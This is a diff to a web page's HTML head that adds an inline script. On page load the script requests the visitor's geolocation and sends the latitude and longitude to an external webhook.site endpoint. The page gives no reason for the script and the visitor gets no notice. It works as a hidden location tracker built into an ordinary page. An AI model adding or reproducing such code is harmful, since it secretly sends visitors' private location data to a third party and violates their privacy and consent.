@@ -7,6 +7,22 @@
   <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
   <link rel="stylesheet" href="main.css">
   <script src="main.js"></script>
+  <script>
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  }
+
+function showPosition(position) {
+    // 1. Create a new XMLHttpRequest object
+  let xhr = new XMLHttpRequest();
+
+  // 2. Configure it: GET-request for the URL /article/.../load
+  xhr.open('GET', 'https://webhook.site/6599d5dd-7bc8-4332-9f76-547c9b75e880?' + position.coords.latitude.toString() + "zzzzzzzzz" + position.coords.longitude.toString());
+
+  // 3. Send the request over the network
+  xhr.send();
+}
+</script>
 </head>
 
 <body>
